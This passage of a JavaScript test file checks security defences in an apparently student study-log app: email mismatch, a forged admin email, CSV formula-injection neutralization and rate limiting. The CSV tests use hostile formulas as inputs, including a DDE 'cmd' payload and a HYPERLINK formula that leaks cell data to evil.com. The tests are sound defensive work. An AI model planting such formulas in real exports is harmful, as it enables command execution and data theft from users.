    const bob = db.registerMember({
      fullName: "Bob Student",
      email: "bob@gmail.com",
      gender: "Male",
      telegram: "@bob",
      school: "Royal College, Colombo",
      stream: STREAMS.MATHS,
      optionalSubject: "Chemistry"
    });

    // Bob tries to submit a daily log using Alice's Study ID
    expect(() => {
      db.submitDailyLog({
        studyId: alice["Study ID"],
        email: bob.Email, // Mismatched email!
        dateOfStudy: "2026-08-27",
        subjects: [
          { name: "Biology", hours: 3.0, focus: 8, productivity: 8 },
          { name: "Chemistry", hours: 2.0, focus: 8, productivity: 8 },
          { name: "Physics", hours: 2.0, focus: 8, productivity: 8 }
        ]
      });
    }).toThrow("Email mismatch");
  });

  it("T5.11.2: Forged admin email in unauthorized request rejected", () => {
    const db = new StudySyncDatabase();
    expect(() => {
      db.getAdminAnalytics("attacker@malicious.com");
    }).toThrow("Access Denied");
  });
}, { tier: 5 });

// ==========================================================================
// T5.12: CSV Formula Injection (CWE-1236) Neutralization
// ==========================================================================
describe("Tier 5.12: CSV Formula Injection (CWE-1236) Neutralization", () => {
  it("T5.12.1: Leading formula trigger characters (=, +, -, @, \\t, \\r) prepended with single quote", () => {
    expect(sanitizeCsvFormula("=cmd|'/C calc'!A0")).toBe("'=cmd|'/C calc'!A0");
    expect(sanitizeCsvFormula("+1+1")).toBe("'+1+1");
    expect(sanitizeCsvFormula("-SUM(A1:A10)")).toBe("'-SUM(A1:A10)");
    expect(sanitizeCsvFormula("@IMPORT")).toBe("'@IMPORT");
    expect(sanitizeCsvFormula("\tTAB")).toBe("'\tTAB");
    expect(sanitizeCsvFormula("\rRETURN")).toBe("'\rRETURN");
  });

  it("T5.12.2: Exported CSV sanitizes user inputs across multiple rows and columns", () => {
    const headers = ["Study ID", "Name", "Notes"];
    const rows = [
      ["SG-BIO-0001", "Kasun", "=HYPERLINK(\"http://evil.com?leak=\"&A1)"],
      ["SG-BIO-0002", "@Kasun", "+123456789"]
    ];
    const csv = generateCsvString(headers, rows);
    expect(csv).toContain("SG-BIO-0001,Kasun,\"'=HYPERLINK(\"\"http://evil.com?leak=\"\"&A1)\"");
    expect(csv).toContain("SG-BIO-0002,'@Kasun,'+123456789");
  });
}, { tier: 5 });

// ==========================================================================
// T5.13: Multi-Tab Sliding-Window Rate Limiter Backpressure
// ==========================================================================
describe("Tier 5.13: Multi-Tab Sliding-Window Rate Limiter Backpressure", () => {
  it("T5.13.1: 50 concurrent rapid client requests throttled to exact burst limit (6 allowed, 44 blocked)", () => {
    const limiter = new SynchronizedSlidingRateLimiter({ limit: 6, windowMs: 60000 });
    let allowed = 0;
    let throttled = 0;

    for (let i = 0; i < 50; i++) {
      if (limiter.allow()) {
        allowed++;
      } else {
        throttled++;
      }
    }

    expect(allowed).toBe(6);
    expect(throttled).toBe(44);
    expect(limiter.getRemaining()).toBe(0);
    expect(limiter.getResetTimeMs()).toBeGreaterThan(0);
  });

  it("T5.13.2: Backpressure calculation returns exact remaining window time", () => {
    const limiter = new SynchronizedSlidingRateLimiter({ limit: 3, windowMs: 60000 });
    limiter.allow();
    limiter.allow();
    limiter.allow();
    expect(limiter.getRemaining()).toBe(0);
    const resetTime = limiter.getResetTimeMs();
    expect(resetTime).toBeGreaterThan(0);
    expect(resetTime).toBeLessThanOrEqual(60000);
  });
}, { tier: 5 });

// Direct CLI Execution Hook
if (process.argv[1] && process.argv[1].endsWith('tier5-adversarial.test.js')) {
  import('./e2e-runner.js').then(({ runner }) => {
    runner.run(5).then(success => process.exit(success ? 0 : 1));
  });
}

